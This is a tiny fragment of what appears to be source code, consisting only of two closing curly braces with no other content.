    }
}
